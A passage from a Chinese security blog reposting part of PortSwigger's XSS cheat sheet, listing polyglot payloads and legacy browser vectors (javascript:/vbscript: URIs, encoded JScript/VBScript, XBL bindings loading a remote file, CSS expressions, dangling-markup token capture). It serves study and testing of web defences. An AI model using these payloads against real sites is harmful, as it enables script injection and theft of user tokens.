<pre><code class="hljs awk">javascript:<span class="hljs-regexp">/*--&gt;&lt;/</span>title&gt;&lt;<span class="hljs-regexp">/style&gt;&lt;/</span>textarea&gt;&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>xmp&gt;&lt;svg<span class="hljs-regexp">/onload=&#x27;+/</span><span class="hljs-string">&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span></code></pre>

<p>多语言有效载荷2</p>
<pre><code class="hljs xml">javascript:&quot;/*&#x27;/*`/*--&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">noembed</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> \&quot;</span>
<span class="hljs-tag"> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">/*&amp;lt;svg/*/onload</span>=<span class="hljs-string">alert()//</span>&gt;</span></code></pre>

<h3 id="经典向量（XSS加密）"><a href="#经典向量（XSS加密）" class="headerlink" title="经典向量（XSS加密）"></a>经典向量（XSS加密）</h3><p>具有JavaScript协议的Image src</p>
<pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre>

<p>带有JavaScript协议的正文背景</p>
<pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre>

<p>随着现代浏览器使用空来源，iframe数据网址不再起作用</p>
<pre><code class="hljs nix">&lt;iframe <span class="hljs-attr">src=&quot;data:text/html,&lt;img</span> <span class="hljs-attr">src=1</span> <span class="hljs-attr">onerror=alert(document.domain)&gt;&quot;&gt;</span></code></pre>

<p>用于IE的VBScript协议</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;vbscript:MsgBox+1&quot;</span>&gt;XSS&lt;/a&gt;
&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;vbs:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;
&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;VBS:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;
&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;vbscript:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;
&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;VBSCRIPT:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;
&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">language</span>=vbs <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;vbscript:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;</code></pre>

<p>JScript compact是JS的最小版本，未在IE中广泛使用</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;jscript.compact:alert(1);&quot;</span>&gt;test&lt;/a&gt;
&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;JSCRIPT.COMPACT:alert(1);&quot;</span>&gt;test&lt;/a&gt;</code></pre>

<p>JScript.Encode允许编码的JavaScript</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=# <span class="hljs-attribute">language</span>=<span class="hljs-string">&quot;JScript.Encode&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=# <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;</span>&gt;XSS&lt;/a&gt;</code></pre>

<p>VBScript.Encoded允许编码的VBScript</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">VBScript.Encode:#@~^CAAAAA</span>==<span class="hljs-string">\ko$K6,FoQIAAA</span>==<span class="hljs-string">^#~@</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">language</span>=<span class="hljs-string">VBScript.Encode</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">#@~^CAAAAA</span>==<span class="hljs-string">\ko$K6,FoQIAAA</span>==<span class="hljs-string">^#~@</span>&gt;</span></code></pre>

<p>用于Netscape Navigator的JavaScript实体</p>
<pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;&amp;</span></span></span><span class="hljs-template-variable">&#123;alert(1)&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>

<p>Netscape Navigator曾经支持JavaScript样式表</p>
<pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;xss.js&quot;</span> <span class="hljs-attribute">rel</span>=stylesheet <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</code></pre>

<p>用于消耗标记的按钮</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>stealme</code></pre>

<p>IE9选择元素和纯文本用于消耗标记</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plaintext</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">token=<span class="hljs-string">&quot;supersecret&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>仅限XBL Firefox &lt;= 2</p>
<pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)&quot;</span>&gt;
&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)&quot;</span>&gt;
&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)&quot;</span>&gt;
&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;-moz-bindin&amp;#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)&quot;</span>&gt;</code></pre>

<p>XBL也使用数据URL在FF3.5中工作</p>
<pre><code class="hljs perl">&lt;img src=<span class="hljs-string">&quot;blah&quot;</span> style=<span class="hljs-string">&quot;-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)&quot;</span> /&gt;</code></pre>

<p>CSS表达式&lt;= IE7</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expression(alert(1))</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expression(1)-alert(1)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\6e(alert(1))</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\006e(alert(1))</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\00006e(alert(1))</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\6e(alert(1))</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio&amp;#x5c;6e(alert(1))</span>&gt;</span></code></pre>

<p>在怪癖模式下，IE允许您使用=代替：</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss</span>=<span class="hljs-string">expression(alert(1))</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color&amp;#x3dred&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>

<p>IE较旧模式的行为</p>
<pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span> style=<span class="hljs-string">&quot;behavior:url(#default#AnchorClick);&quot;</span> <span class="hljs-built_in">folder</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;XSS&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre>

<p>IE中较旧版本的函数中支持的事件处理程序</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">window</span>.<span class="hljs-title">onload</span>(<span class="hljs-params"></span>)</span>&#123;</span>
alert(1);
&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">window</span>::<span class="hljs-title">onload</span>(<span class="hljs-params"></span>)</span>&#123;</span>
alert(1);
&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">window</span>.<span class="hljs-title">location</span>(<span class="hljs-params"></span>)</span>&#123;</span>
&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span>/*&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=1 <span class="hljs-title">onerror</span>=<span class="hljs-title">alert</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>)&gt;*/<span class="hljs-title">document</span>.<span class="hljs-title">body</span>.<span class="hljs-title">innerHTML</span>(<span class="hljs-params"></span>)</span>&#123;&#125;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">document</span>.<span class="hljs-title">body</span>.<span class="hljs-title">innerHTML</span>(<span class="hljs-params"></span>)</span>&#123; x = <span class="hljs-string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>; &#125;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre>

<p>GreyMagic HTML + time漏洞利用（即使在5 docmode下也不再起作用）</p>
<pre><code class="hljs vim"><span class="hljs-symbol">&lt;HTML&gt;</span><span class="hljs-symbol">&lt;BODY&gt;</span>&lt;?<span class="hljs-keyword">xm</span><span class="hljs-variable">l:namespace</span> prefix=<span class="hljs-string">&quot;t&quot;</span> ns=<span class="hljs-string">&quot;urn:schemas-microsoft-com:time&quot;</span>&gt;&lt;?import namespace=<span class="hljs-string">&quot;t&quot;</span> implementation=<span class="hljs-string">&quot;#default#time2&quot;</span>&gt;&lt;<span class="hljs-variable">t:set</span> attributeName=<span class="hljs-string">&quot;innerHTML&quot;</span> <span class="hljs-keyword">to</span>=<span class="hljs-string">&quot;XSS&lt;img src=1 onerror=alert(1)&gt;&quot;</span>&gt; &lt;/BODY&gt;&lt;/HTML&gt;</code></pre>

<hr>
<blockquote>
<p>原文地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
</blockquote>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/">学习文章</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9.net%20Ueditor">
                        <span class="hidden-mobile">佛学的魔改.net Ueditor</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <span>iceH</span> <i class="iconfont icon-love"></i> <span>欢迎您来到咸鱼的博客！</span> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
